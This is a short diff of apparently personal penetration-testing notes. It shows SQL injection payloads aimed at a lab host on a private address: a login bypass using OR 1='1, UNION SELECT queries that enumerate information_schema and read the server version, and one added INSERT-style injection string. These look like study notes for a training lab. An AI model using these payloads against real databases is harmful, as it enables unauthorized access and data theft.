@@ -75,6 +75,8 @@ username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271 -> URL....php?username=tom
   http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT 1,2,3
   http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
   http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT% 1,2,@@version      #GETS SQL VERSION
+
+Hacker' ,cook',cook',1) # \
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
           ###REVERSE ENGINEERING###
 main: 
